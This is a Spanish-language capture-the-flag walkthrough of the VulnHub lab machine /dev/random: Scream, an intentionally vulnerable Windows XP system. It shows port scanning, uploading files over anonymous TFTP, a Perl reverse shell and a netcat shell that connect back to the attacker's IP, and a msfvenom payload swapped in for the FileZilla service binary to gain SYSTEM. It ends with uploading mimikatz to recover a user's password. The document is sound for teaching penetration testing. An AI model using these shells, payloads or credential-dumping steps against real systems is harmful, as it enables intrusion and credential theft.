# -DEV-RANDOM-SCREAM
Desarrollo del CTF /DEV/RANDOM: SCREAM

Download: https://www.vulnhub.com/entry/devrandom-scream,47/

## Configuración ANTES DE INICIAR
- No descargas realmente una máquina virtual, descargas un EXE que inyecta en una ISO de Windows XP las vulnerabilidades.
- Debes tener una ISO de Windows XP para poder crear la VM.
- Después de utilizar SCREAM.EXE, se genera una nueva ISO que debes instalar en VMWARE. Recien con esto tienes la VM para el CTF.

Puedes descargar el XP desde aquí: https://archive.org/details/WinXPProSP3x86 
Importante: También necesitarás el SERIAL de Windows XP pero eso lo obtienes en Google.

<img src="https://github.com/El-Palomo/-DEV-RANDOM-SCREAM/blob/main/scream1.jpg" width=80% />

## 2. Escaneo de Puertos

### 2.1. Puertos TCP

```
nmap -n -P0 -p- -sC -sV -O -T5 -oA full 192.168.78.145
Nmap scan report for 192.168.78.145
Host is up (0.00043s latency).
Not shown: 65531 filtered ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     WAR-FTPD 1.65 (Name Scream XP (SP2) FTP Service)
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| drwxr-xr-x 1 ftp ftp              0 Mar 02 16:16 bin
| drwxr-xr-x 1 ftp ftp              0 Mar 02 16:19 log
|_drwxr-xr-x 1 ftp ftp              0 Mar 02 16:16 root
|_ftp-bounce: bounce working!
| ftp-syst: 
|_  SYST: UNIX emulated by FileZilla
22/tcp open  ssh     WeOnlyDo sshd 2.1.3 (protocol 2.0)
| ssh-hostkey: 
|   1024 2c:23:77:67:d3:e0:ae:2a:a8:01:a4:9e:54:97:db:2c (DSA)
|_  1024 fa:11:a5:3d:63:95:4a:ae:3e:16:49:2f:bb:4b:f1:de (RSA)
23/tcp open  telnet
| fingerprint-strings: 
|   GenericLines, NCP, RPCCheck, tn3270: 
|     Scream Telnet Service
|     login:
|   GetRequest: 
|     HTTP/1.0
|     Scream Telnet Service
|     login:
|   Help: 
|     HELP
|     Scream Telnet Service
|     login:
|   SIPOptions: 
|     OPTIONS sip:nm SIP/2.0
|     Via: SIP/2.0/TCP nm;branch=foo
|     From: <sip:nm@nm>;tag=root
|     <sip:nm2@nm2>
|     Call-ID: 50000
|     CSeq: 42 OPTIONS
|     Max-Forwards: 70
|     Content-Length: 0
|     Contact: <sip:nm@nm>
|     Accept: application/sdp
|     Scream Telnet Service
|_    login:
80/tcp open  http    Tinyweb httpd 1.93
|_http-server-header: TinyWeb/1.93
|_http-title: The Scream - Edvard Munch

```

### 2.2. Puertos UDP

```
root@kali:~/SCREAM# nmap -n -P0 -sU -F 192.168.78.147
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-03 22:57 EST
Nmap scan report for 192.168.78.147
Host is up (0.00042s latency).
Not shown: 99 open|filtered ports
PORT   STATE SERVICE
69/udp open  tftp
MAC Address: 00:0C:29:DC:6F:4C (VMware)
```

> Encontrar un puerto UDP abierto no es común, seguro tiene un papel que jugar en el CTF (es un clásico).


## 3. Enumeración de Servicios

### 3.1. Enumeración de FTP
- El servicio permite acceso FTP anónimo. 

```
root@kali:~/SCREAM# ftp 192.168.78.147
Connected to 192.168.78.147.
220- Scream XP (SP2) FTP Service WAR-FTPD 1.65 Ready
220 Please enter your user name.
Name (192.168.78.147:kali): anonymous
331 Password required for anonymous
Password:
230 Logged on
Remote system type is UNIX.
ftp> 
```
- La carpeta ROOT parece ser la carpeta raíz de un servidor web.

<img src="https://github.com/El-Palomo/-DEV-RANDOM-SCREAM/blob/main/scream2.jpg" width=80% />

- No es posible descargar ni subir archivos a través del FTP anónimo.

<img src="https://github.com/El-Palomo/-DEV-RANDOM-SCREAM/blob/main/scream3.jpg" width=80% />

<img src="https://github.com/El-Palomo/-DEV-RANDOM-SCREAM/blob/main/scream4.jpg" width=80% />


### 3.2. Enumeración Web

- Enumeramos archivos y carpetas. GOBUSTER no me funcionó, asi que probé con DIRSEARCH.
- Llama la atención la carpeta CGI-BIN (ya la habiamos visto con el acceso FTP).

```
root@kali:~/SCREAM/dirsearch# python3 dirsearch.py -u http://192.168.78.147:80/ -t 16 -r -e txt,html,php,asp,aspx,jsp -f -w /usr/share/seclists/Discovery/Web-Content/big.txt --plain-text-report="/root/SCREAM/autorecon/192.168.78.145/scans/tcp_80_http_dirsearch_big.txt"

  _|. _ _  _  _  _ _|_    v0.4.1
 (_||| _) (/_(_|| (_| )

Extensions: txt, html, php, asp, aspx, jsp | HTTP method: GET | Threads: 16 | Wordlist size: 163783

Error Log: /root/SCREAM/dirsearch/logs/errors-21-03-03_18-40-13.log

Target: http://192.168.78.147:80/

Output File: /root/SCREAM/dirsearch/reports/192.168.78.147/_21-03-03_18-40-13.txt

[18:40:13] Starting: 
[18:40:31] 200 -   14KB - /Index.html
[18:40:31] 403 -   72B  - /MANIFEST.MF
[18:40:33] 403 -   72B  - /Thumbs.db
[18:40:36] 302 -   88B  - /_html  ->  /_html/     (Added to queue)
[18:40:38] 302 -   88B  - /_php  ->  /_php/     (Added to queue)
[18:40:40] 302 -   88B  - /_vit_txt  ->  /_vit_txt/     (Added to queue)
[18:40:40] 302 -   88B  - /_vti-txt  ->  /_vti-txt/     (Added to queue)
[18:40:40] 302 -   88B  - /_vti_txt  ->  /_vti_txt/     (Added to queue)
[18:40:43] 403 -   72B  - /access-log.1
[18:40:43] 403 -   72B  - /access.1
[18:40:43] 403 -   72B  - /access_log.1
[18:40:51] 302 -   88B  - /ajaxhtml  ->  /ajaxhtml/     (Added to queue)
[18:40:52] 302 -   88B  - /ajaxresponhtml  ->  /ajaxresponhtml/     (Added to queue)
[18:40:54] 302 -   88B  - /amfphp  ->  /amfphp/     (Added to queue)
[18:41:01] 302 -   88B  - /articleasp  ->  /articleasp/     (Added to queue)
[18:41:01] 302 -   88B  - /articlephp  ->  /articlephp/     (Added to queue)
[18:41:01] 302 -   88B  - /asdfjkl;.html  ->  /asdfjkl/     (Added to queue)
[18:41:01] 302 -   88B  - /asdfjkl;.txt  ->  /asdfjkl/
[18:41:01] 302 -   88B  - /asdfjkl;.asp  ->  /asdfjkl/
[18:41:01] 302 -   88B  - /asdfjkl;.aspx  ->  /asdfjkl/
[18:41:01] 302 -   88B  - /asdfjkl;.php  ->  /asdfjkl/
[18:41:01] 302 -   88B  - /asdfjkl;.jsp  ->  /asdfjkl/
[18:41:01] 302 -   88B  - /asdfjkl;/  ->  /asdfjkl/
[18:41:02] 302 -   88B  - /asp  ->  /asp/     (Added to queue)
[18:41:02] 302 -   88B  - /aspx  ->  /aspx/     (Added to queue)
[18:41:26] 302 -   88B  - /cache_html  ->  /cache_html/     (Added to queue)
[18:41:34] 500 -  139B  - /cgi-bin/     (Added to queue)
[18:41:35] 302 -   88B  - /cgi-html  ->  /cgi-html/     (Added to queue)
```

<img src="https://github.com/El-Palomo/-DEV-RANDOM-SCREAM/blob/main/scream5.jpg" width=80% />


### 3.3. Enumeración TFTP
- Tenemos acceso anónimo TFTP. Los comandos TFTP pueden verse aquí: https://www.tutorialspoint.com/unix_commands/tftp.htm
- Subimos un archivo y veamos si se carga en el servidor web (un clásico utilizado en los CTF).

```
root@kali:~/SCREAM# tftp 192.168.78.147
tftp> status
Connected to 192.168.78.147.
Mode: netascii Verbose: off Tracing: off
Rexmt-interval: 5 seconds, Max-timeout: 25 seconds
tftp> put live.txt
```

<img src="https://github.com/El-Palomo/-DEV-RANDOM-SCREAM/blob/main/scream6.jpg" width=80% />

- Necesitamos ejecutar un webshell que permita la ejecución REMOTA de comandos. El CGI-BIN puede ayudar porque permite la ejecución de scripts en PERL.

```
use IO::Socket::INET;$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"192.168.78.131:443");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;

192.168.78.131: es la IP de KALI para establecer la conexión reversa
```

- Cargamos el archivo PERL en la carpeta CGI y establecemos la conexión reversa.

```
tftp> status
Connected to 192.168.78.147.
Mode: netascii Verbose: off Tracing: off
Rexmt-interval: 5 seconds, Max-timeout: 25 seconds
tftp> put reverse.pl cgi-bin/reverse.pl
Sent 152 bytes in 0.0 seconds
```

- En KALI Linux abrimos una conexión NETCAT.

```
root@kali:~# netcat -lvp 443
Connection from 192.168.78.147:1037
dir
 Volume in drive C has no label.
 Volume Serial Number is D408-A5E7

 Directory of c:\www\root\cgi-bin

03/03/2021  11:30 PM    <DIR>          .
03/03/2021  11:30 PM    <DIR>          ..
03/03/2021  07:20 PM               462 live.txt
03/03/2021  10:45 AM            36,528 nc.exe
03/03/2021  11:30 PM               153 reverse.pl
03/03/2021  10:42 AM               153 script3.pl
03/03/2021  10:47 AM            73,802 test.exe
               5 File(s)        111,098 bytes
               2 Dir(s)  38,717,788,160 bytes free
```

<img src="https://github.com/El-Palomo/-DEV-RANDOM-SCREAM/blob/main/scream7.jpg" width=80% />


### 3.4. Cargar un NETCAT

- El acceso que hemos obtenido no permite navegar ni interacturar de manera comoda, vamos a subir un netcat para que sea más facil.
- Descargar NETCAT desde esta URL: https://eternallybored.org/misc/netcat/

```
* Cargamos el NETCAT
tftp> put nc.exe cgi-bin/nc.exe

* Ejecutamos el NETCAT
nc.exe -e cmd 192.168.78.131 5555 

* Abrimos un puertos para la conexión
root@kali:~# netcat -lvp 5555

```

<img src="https://github.com/El-Palomo/-DEV-RANDOM-SCREAM/blob/main/scream8.jpg" width=80% />


## 4. Elevar privilegios

### 4.1. Características actuales de acceso

- El usuario de acceso es: ALEX y pertenece al grupo ADMINISTRATORS

<img src="https://github.com/El-Palomo/-DEV-RANDOM-SCREAM/blob/main/scream9.jpg" width=80% />


### 4.2. Buscar procesos que se ejecutan con privilegios SYSTEM

- Encontramos un SERVICIO DE RED que corra con privilegios de SYSTEM, buscamos su binario y lo reemplazamos con un BINARIO MALICIOSO. Reiniciamos el servicio que se ejecuta como SYSTEM y se ejecuta nuestro binario malicioso (por lo general una conexión reversa).

- Buscamos procesos "NO CONVENCIONALES" que se ejecuten como SYSTEM.

```
c:\www\root\cgi-bin>tasklist /FI "username eq SYSTEM"
tasklist /FI "username eq SYSTEM"

Image Name                   PID Session Name     Session#    Mem Usage
========================= ====== ================ ======== ============
System Idle Process            0 Console                 0         28 K
System                         4 Console                 0        556 K
smss.exe                     592 Console                 0        388 K
csrss.exe                    656 Console                 0      3,524 K
winlogon.exe                 680 Console                 0      7,040 K
services.exe                 724 Console                 0      3,152 K
lsass.exe                    736 Console                 0      1,532 K
svchost.exe                  896 Console                 0      4,604 K
svchost.exe                 1100 Console                 0     16,408 K
avgchsvx.exe                1160 Console                 0      1,160 K
avgrsx.exe                  1168 Console                 0        724 K
avgcsrvx.exe                1564 Console                 0      1,668 K
spoolsv.exe                 1720 Console                 0      4,412 K
avgwdsvc.exe                 636 Console                 0      2,684 K
FileZilla server.exe         856 Console                 0      2,904 K
FreeSSHDService.exe          980 Console                 0      4,000 K
OpenTFTPServerMT.exe        1068 Console                 0      1,856 K
```

<img src="https://github.com/El-Palomo/-DEV-RANDOM-SCREAM/blob/main/scream10.jpg" width=80% />


### 4.3. Reemplazar el binario original que ejecuta el proceso FILEZILLA

```
* Detenemos el servicio Vulnerable"
C:\Program Files\FileZilla Server>net stop "FileZilla Server FTP Server"
net stop "FileZilla Server FTP Server"
The FileZilla Server FTP server service is stopping.
The FileZilla Server FTP server service was stopped successfully.

* Hacemos una copia del binario original
C:\Program Files\FileZilla Server>move "FileZilla server.exe" "FileZilla server.exe.bak"
move "FileZilla server.exe" "FileZilla server.exe.bak"

* Creamos un payload en KALI LINUX
msfvenom -p windows/shell/reverse_tcp LHOST=192.168.78.131 -a x86 --platform Windows -f exe -o test.exe

* Copiamos el PAYLOAD como si fuera el binario original
move C:\www\root\test.exe "FileZilla server.exe"

* Levantamos el servicio de nuevo
net start "FileZilla Server FTP Server"

```

<img src="https://github.com/El-Palomo/-DEV-RANDOM-SCREAM/blob/main/scream11.jpg" width=80% />

### 4.4. Ejecutamos MIMIKATIZ

- Subimos MIMIKATZ a Windows XP y luego lo ejecutamos.
- Obtenemos la contraseña del usuario ALEX.

```
tftp> put mimikatz.exe         
Sent 1013260 bytes in 1.2 seconds
```

<img src="https://github.com/El-Palomo/-DEV-RANDOM-SCREAM/blob/main/scream12.jpg" width=80% />

